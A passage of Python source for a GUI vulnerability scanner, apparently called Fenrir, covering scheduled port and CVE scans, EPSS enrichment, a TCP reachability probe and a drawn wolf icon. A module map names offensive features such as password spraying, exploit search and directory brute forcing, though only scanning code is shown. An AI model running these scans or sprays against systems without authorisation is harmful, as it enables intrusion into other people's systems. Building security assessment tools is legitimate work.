            if scan_type == "network":
                report = loop.run_until_complete(
                    ns.run(target, output_dir=output_dir))
            else:
                from .report_manager import ReportManager
                rpt = ReportManager(output_dir, target)
                from .port_scanner import PortScanner as PS
                from .vulnerability_scanner import VulnerabilityScanner as VS
                open_ports = loop.run_until_complete(PS().run(target))
                if open_ports:
                    cves = loop.run_until_complete(VS().run(target, open_ports))
                    rpt.add_section("Port Scan", [{"port": p} for p in open_ports])
                    for port, cv in (cves or {}).items():
                        rpt.add_section(f"CVEs port {port}", cv)
                rpt.finalize()
                report = rpt
            summary = {"scheduled": True, "target": target}
            self._history.finish_scan(scan_id, output_dir, summary, {})
            log.info(f"[schedule] Completed: {target}")
        except Exception as exc:
            log.error(f"[schedule] Scan error for {target}: {exc}")

    # =========================================================================
    # EPSS enrichment
    # =========================================================================

    def _enrich_epss_async(self) -> None:
        """Fetch EPSS scores for all CVEs in the vulns tree and annotate rows."""
        if not hasattr(self, "_vulns_tree"):
            return
        cve_ids = []
        iid_map: dict[str, list[str]] = {}  # cve_id → list of tree iids
        for iid in self._vulns_tree.get_children():
            vals = self._vulns_tree.item(iid, "values")
            if vals:
                cve_id = str(vals[0])
                if cve_id.startswith("CVE-"):
                    cve_ids.append(cve_id)
                    iid_map.setdefault(cve_id, []).append(iid)
        if not cve_ids:
            return

        def _fetch():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                return loop.run_until_complete(get_epss(list(set(cve_ids)), timeout=10))
            except Exception as exc:
                log.debug(f"[epss] fetch failed: {exc}")
                return {}

        def _apply(epss_data: dict):
            for cve_id, entry in epss_data.items():
                score_pct = f"{entry['score']*100:.1f}%"
                for iid in iid_map.get(cve_id, []):
                    vals = list(self._vulns_tree.item(iid, "values"))
                    # Append EPSS to description column if it fits
                    if len(vals) >= 6:
                        desc = str(vals[5])
                        if "[EPSS" not in desc:
                            vals[5] = f"{desc}  [EPSS {score_pct}]"
                    self._vulns_tree.item(iid, values=vals)
            log.debug(f"[epss] Enriched {len(epss_data)} CVEs")

        t = threading.Thread(target=lambda: self.after(0, lambda: _apply(_fetch())),
                              daemon=True)
        t.start()



def _is_private_ip(target: str) -> bool:
    """Return True if target looks like an RFC1918/loopback/link-local address."""
    import ipaddress
    try:
        addr = ipaddress.ip_address(target)
        return addr.is_private or addr.is_loopback or addr.is_link_local
    except ValueError:
        return False  # hostname — assume public


def _looks_like_ip(target: str) -> bool:
    """Return True if target is a bare IP address (v4 or v6), not a hostname."""
    import ipaddress
    try:
        ipaddress.ip_address(target)
        return True
    except ValueError:
        return False


async def _host_is_up(target: str, timeout: float = 2.0) -> bool:
    """
    Quick reachability check before committing to a full port scan.
    Tries a TCP connect on ports 80, 443, 22, 5555 in parallel.
    Falls back to True (scan anyway) if all attempts time out,
    so we don't block scanning on firewalled hosts.
    """
    probe_ports = [80, 443, 22, 5555, 23, 8080]

    async def _probe(port: int) -> bool:
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port), timeout=timeout
            )
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            return True
        except Exception:
            return False

    results = await asyncio.gather(*[_probe(p) for p in probe_ports],
                                    return_exceptions=True)
    return any(r is True for r in results)


def _fmt_elapsed(seconds: float) -> str:
    s = int(seconds)
    h, r = divmod(s, 3600)
    m, s = divmod(r, 60)
    if h:
        return f"{h}h {m:02d}m {s:02d}s"
    return f"{m}m {s:02d}s"


def _module_key_to_class(key: str) -> str:
    mapping = {
        "port_scan":      "PortScanner",
        "vuln_scan":      "VulnerabilityScanner",
        "web_scan":       "WebScanner",
        "dir_brute":      "DirBruteForcer",
        "tech_detect":    "TechDetector",
        "subdomain_scan": "SubdomainScanner",
        "dns_scan":       "DnsScanner",
        "whois_scan":     "WhoisScanner",
        "osint_scan":     "OsintScanner",
        "threat_intel":   "ThreatIntelScanner",
        "exploit_search": "ExploitScanner",
        "pass_spray":     "PasswordSprayer",
        "iot_scan":       "IotScanner",
        "ot_scan":        "OtScanner",
        "mobile_scan":    "MobileScanner",
        "rf_scan":        "RfScanner",
    }
    return mapping.get(key, key)


# =============================================================================
# Entry point
# =============================================================================

def _hex_to_rgb(hex_colour: str) -> tuple[int, int, int]:
    """Convert '#rrggbb' to (r, g, b) tuple."""
    h = hex_colour.lstrip("#")
    return tuple(int(h[i:i+2], 16) for i in (0, 2, 4))  # type: ignore[return-value]


def _make_wolf_icon(size: int = 32) -> Image.Image:
    """Generate a simple procedural wolf-head icon when no logo file is present."""
    img  = Image.new("RGBA", (size, size), (30, 30, 46, 255))
    draw = ImageDraw.Draw(img)
    s    = size / 32          # scale factor
    # Body / head oval
    draw.ellipse([4*s, 6*s, 28*s, 26*s], fill=(137, 180, 250, 255))
    # Ears
    draw.polygon([(6*s, 8*s), (2*s, 2*s), (12*s, 6*s)], fill=(137, 180, 250, 255))
    draw.polygon([(26*s, 8*s), (30*s, 2*s), (20*s, 6*s)], fill=(137, 180, 250, 255))
    # Eyes
    draw.ellipse([9*s, 13*s, 13*s, 17*s], fill=(30, 30, 46, 255))
    draw.ellipse([19*s, 13*s, 23*s, 17*s], fill=(30, 30, 46, 255))
    # Snout
    draw.ellipse([11*s, 18*s, 21*s, 24*s], fill=(100, 120, 180, 255))
    # Nose
    draw.ellipse([14*s, 18*s, 18*s, 21*s], fill=(30, 30, 46, 255))
    return img


def launch_gui() -> None:
    app = FenrirGUI()
    app.mainloop()

